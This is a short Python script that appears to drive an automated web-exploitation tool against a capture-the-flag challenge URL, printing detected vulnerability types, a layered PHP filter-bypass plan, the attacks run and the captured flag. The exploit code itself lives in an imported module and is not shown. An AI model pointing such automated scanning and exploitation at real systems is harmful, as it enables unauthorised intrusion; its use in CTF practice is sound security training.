import sys, os
sys.path.insert(0, '.')
from yang_web.core.url_analyzer import analyze_url, auto_exploit

url = 'http://80-2005f10e-b861-4aa9-8f0c-bc279804f290.challenge.ctfplus.cn'

print("=== Step 1: analyze_url ===")
result = analyze_url(url)
for r in result['results']:
    print(f"  [{r['confidence']}%] {r['type']} params={r['params']}")

plan = result.get('php_bypass')
if plan:
    print(f"\n  PHP Bypass: {plan['solved_layers']}/{plan['total_layers']} layers solved")
    for step in plan['attack_plan']:
        print(f"    L{step['layer']}: {step['bypass']}")

print("\n=== Step 2: auto_exploit ===")
final = auto_exploit(url, result['results'], fingerprint=result.get('fingerprint'))
print(f"Flag: {final.get('flag')}")
print(f"Attacks: {final.get('attacks_run')}")
print(f"Timing: {final.get('timing_ms', 0)/1000:.1f}s")
